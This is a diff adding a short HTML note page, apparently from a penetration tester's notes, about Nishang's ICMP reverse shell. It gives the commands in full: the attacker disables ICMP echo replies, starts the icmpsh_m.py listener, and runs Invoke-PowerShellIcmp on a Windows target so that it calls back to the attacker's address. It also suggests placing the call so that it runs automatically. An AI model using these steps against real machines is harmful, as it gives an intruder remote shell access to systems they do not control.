@@ -1,0 +1,15 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Nishang</title>
+</head><body>Nishang PowerShellICMP requires a server-side piece called icmpsh_m.py, which is not included in the repo. It can be obtained <a href="https://github.com/inquisb/icmpsh.git">here</a>&nbsp;or in child page.<br/>
+<br/>
+#make sure you ignore sending echo replies<br/>
+sysctl -w net.ipv4.icmp_echo_ignore_all=1<br/>
+<br/>
+#start server on attacker<br/>
+python icmpsh_m.py &lt;LHOST&gt; &lt;RHOST&gt;<br/>
+<br/>
+#invoke shell, place at bottom of Invoke-PowerShellIcmp to exec automatically<br/>
+Windows pswh &gt; Invoke-PowerShellIcmp -IPAddress &lt;LHOST&gt;</body></html>
